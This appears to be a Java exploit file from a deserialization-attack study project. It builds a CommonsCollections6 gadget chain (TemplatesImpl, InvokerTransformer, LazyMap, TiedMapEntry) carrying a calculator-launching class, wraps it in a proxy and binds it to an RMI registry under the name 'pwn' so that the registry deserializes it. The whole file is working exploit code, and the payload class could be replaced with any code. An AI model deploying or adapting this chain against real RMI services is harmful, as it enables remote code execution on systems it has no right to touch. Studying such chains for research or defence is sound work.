package RMI.SAR;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.Calc;
import util.Utils;

import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        // CommonsCollections6
        TemplatesImpl templates = Utils.creatTemplatesImpl(Calc.class);
        Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);
        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.clear();
        Utils.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

        // bind to registry
        Registry registry = LocateRegistry.getRegistry(1099);
        InvocationHandlerImpl handler = new InvocationHandlerImpl(expMap);
        Remote remote = (Remote) Proxy.newProxyInstance(handler.getClass().getClassLoader(), new Class[]{Remote.class}, handler);
        registry.bind("pwn", remote);
    }
}
